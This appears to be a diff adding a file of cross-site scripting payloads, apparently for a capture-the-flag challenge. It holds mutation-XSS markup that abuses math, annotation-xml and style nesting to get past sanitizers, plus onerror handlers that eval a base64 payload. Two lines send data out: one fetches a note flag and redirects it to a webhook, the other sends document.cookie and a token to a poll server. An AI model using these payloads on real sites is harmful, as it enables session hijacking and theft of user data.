@@ -1,0 +1,14 @@
+fetch(`/api/note/flag`).then((r) => r.text()).then((r) => location = `<webhook>?a=` + encodeURIComponent(r))
+    < math> <annotation-xml encoding="text/html">
+            <style>
+                <img src=x onerror="eval(atob(`<base64 payload`))">
+            </style>
+        </annotation-xml></>
+
+
+
+    <math>
+        <mtext><svg>
+                <style>
+                    <a title="
+                </style><img src onerror=fetch(`{poll_server}/notify?token={token}&cookie=${{document.cookie}}`)>">test
